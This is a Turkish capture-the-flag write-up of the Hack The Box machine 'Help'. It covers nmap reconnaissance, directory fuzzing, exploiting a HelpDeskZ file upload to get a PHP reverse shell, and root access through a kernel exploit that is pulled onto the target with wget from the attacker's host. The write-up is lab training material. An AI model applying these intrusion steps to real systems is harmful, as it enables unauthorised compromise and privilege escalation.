###### Bazı bölümler writeuplara bakılarak çözülmüştür.

###### Yazı seviyesi: Elemantary

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpLogo.png "Help Info Card")

Bilgi Toplama ve Servis Keşfi
======

### Nmap 1
```terminal
root@kali:~/Downloads/HTB_Help# nmap 10.10.10.121
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 18:46 EDT
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.065s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```
### Nmap 2
```terminal
root@kali:~# nmap -A -T5 help.htb --vv
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 18:48 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Initiating Ping Scan at 18:48
Scanning help.htb (10.10.10.121) [4 ports]
Completed Ping Scan at 18:48, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:48
Scanning help.htb (10.10.10.121) [1000 ports]
Discovered open port 22/tcp on 10.10.10.121
Discovered open port 80/tcp on 10.10.10.121
Discovered open port 3000/tcp on 10.10.10.121
Completed SYN Stealth Scan at 18:48, 3.18s elapsed (1000 total ports)
Initiating Service scan at 18:48                                                                           
Scanning 3 services on help.htb (10.10.10.121)                                                             
Completed Service scan at 18:48, 11.23s elapsed (3 services on 1 host)                                     
Initiating OS detection (try #1) against help.htb (10.10.10.121)                                           
adjust_timeouts2: packet supposedly had rtt of -160699 microseconds.  Ignoring time.                       
adjust_timeouts2: packet supposedly had rtt of -160699 microseconds.  Ignoring time.
Retrying OS detection (try #2) against help.htb (10.10.10.121)
adjust_timeouts2: packet supposedly had rtt of -194312 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -194312 microseconds.  Ignoring time.
Initiating Traceroute at 18:48
Completed Traceroute at 18:48, 0.07s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 18:48
Completed Parallel DNS resolution of 2 hosts. at 18:48, 0.01s elapsed
NSE: Script scanning 10.10.10.121.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 2.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Nmap scan report for help.htb (10.10.10.121)
Host is up, received reset ttl 63 (0.066s latency).
Scanned at 2020-05-13 18:48:13 EDT for 22s
Not shown: 997 closed ports
Reason: 997 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
OS fingerprint not ideal because: Timing level 5 (Insane) used
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), Linux 4.9 (95%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=5/13%OT=22%CT=1%CU=34066%PV=Y%DS=2%DC=T%G=N%TM=5EBC7943%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%TS=8)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.001 days (since Wed May 13 18:47:32 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   65.57 ms 10.10.14.1
2   65.66 ms help.htb (10.10.10.121)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds
           Raw packets sent: 1387 (65.828KB) | Rcvd: 2256 (94.772KB)
```
### Nmap 3
```terminal
root@kali:~# nmap -A -T5 help.htb -O -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 18:51 EDT
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.067s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), Linux 4.8 (95%), Linux 4.9 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   64.90 ms 10.10.14.1
2   63.69 ms help.htb (10.10.10.121)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.99 seconds
```

![-](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "*")


Fuzzing
======

Nmap taramalarında 80 portu ve apache gördükten sonra dirb, gobuster, wfuzz gibi toollar ile taradım.

### Wfuzz

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/wfuzz1.png "Wfuzz Scan 1")

```terminal
root@kali ~# wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 -R 3 http://help.htb/support/FUZZ
```

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/wfuzz2.png "Wfuzz Scan 2")

### Gobuster

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/gobuster1.png "Gobuster Scan 1")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/gobuster2.png "Gobuster Scan 1")

### Dirb

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/gobuster3.png "Dirb Scan 1")

![-](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "*")


Uygulama Hakkında Bilgi Toplama 
======

Gobuster ve diğer toollar ile fuzz ettiğimde "support" dizinini gördüm. Buraya eriştiğimde "HelpDeskZ" vardı(http://help.htb/support/). Burada biraz gezindikten sonra uygulama versiyonunu ve exploit araştırdım.

HelpDeskZ için githuba baktığımda readme içerisinde versiyon bilgisi yazıyordu. http://help.htb/support/README.md urlini denedim ve readme dosyası geldi. 1.0.2 son sürüm. 

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpDeskZVersiyon1.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpDeskZVersiyon2.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpDeskZVersiyon3.png "--")

2 exploit `searchsploit helpdeskz` ile gözükmekte. 

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/searchsploit1.png "--")

`searchsploit -x php/webapps/40300.py` komutu ile içeriğini görüntüleyelim. 
![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/searchsploit2.png "--")

Dosya isimlendirmesi için fonksiyonu görmekteyiz. "-m" parametresiyle exploit dosyasını indirdim.
![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/searchsploit3.png "--")

Helpdeskz>submit a ticket menüsünden 1 tane reverse shell php dosyası bir tanede png dosyası gönderdim. Github üzerinden baktığımda upload>ticket adlı bir directory ve içerisinde php dosyası gördüm. Aynı zamanda bu directoryi fuzzing sırasında da keşfetmiştim. 

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpDeskZGithubUpload.png "--")


![-](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "*")


Exploit
======

Server date ile kali date arasında fark var. python ve requests module ile headers kullanarak date bilgisi çekilebiliyor.

```terminal
root@kali ~/D/HTB_Help [1]# python
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> r = requests.head('http://help.htb')
>>> print r.headers
{'Content-Length': '3186', 'Content-Encoding': 'gzip', 'Accept-Ranges': 'bytes', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Last-Modified': 'Tue, 27 Nov 2018 13:49:28 GMT', 'Connection': 'Keep-Alive', 'ETag': '"2c39-57ba5b7e5205d-gzip"', 'Date': 'Sun, 17 May 2020 16:49:21 GMT', 'Content-Type': 'text/html'}
>>> r.headers['Date']
'Sun, 17 May 2020 16:49:21 GMT'
```
![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/pythonServerTime.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/responseDateWithBurp.png "--")

40300.py adlı exploit dosyasında iki ayrı kod bloğu vardı. Çözümlere ve ippsec video suna bakarak değişiklik yapyım. exploit-db deki hali biraz farklı. [Değiştirilmiş exploit](https://github.com/JohnGkmn/CyberSecurity/blob/master/WriteUp/HTB_Help/40300.py)

Submit Ticket bölümünde file upload yapabiliyoruz ve php dosyası gönderebiliyoruz. Php reverse shell dosyası upload ettim. Exploitde de açıklandığı gibi hata vermesine rağmen file servera gitmiş oluyor.

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpDeskZNewTicket.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/helpDeskZUploadError.png "--")

Shell dosyasını upload ettikten sonra bir terminalde netcat açıp diğer terminalde exploiti kullanarak shell aldım.

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/exploitTest6.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/exploitTest7.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/ownuser.png "--")


[HelpDeskZ için diğer exploit](https://github.com/JohnGkmn/CyberSecurity/blob/master/WriteUp/HTB_Help/41200.py)

![-](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "*")


Privilege Escalation
======

Shell upgrade için; `python -c 'import pty;pty.spawn("/bin/bash")'`

Linux kernel;
```terminal
 $ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 
```

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/privilege1.png "--")

`searchsploit 4.4.0-116` şekilnde arama yaptığımızda linux kernel için bir exploit olduğunu görüyoruz.
`searchsploit -m linux/local/44298.c` komutu ile indirdim.

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/privilege2.png "--")

python HTTP server kullanarak erişime açıp hedef makinede indirmek için ise; `wget http://10.10.14.39:3434/44298.c`
![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/privilege3.png "--")

C dosyasını derledim ve çalıştırdım.

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/privilege4.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/privilege5.png "--")

![-](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/ownRoot.png "--")


[Kullandığım exploit dosyası](https://raw.githubusercontent.com/JohnGkmn/CyberSecurity/master/WriteUp/HTB_Help/44298.c)

![-](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "*")



![ToDoList](https://image.flaticon.com/icons/svg/2246/2246610.svg "Task")

_____

Want to suggest something? Please [Send me a request](https://github.com/JohnGkmn/JohnGkmn.github.io/issues/new).
![writeup](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/map-location.png "walktrough")
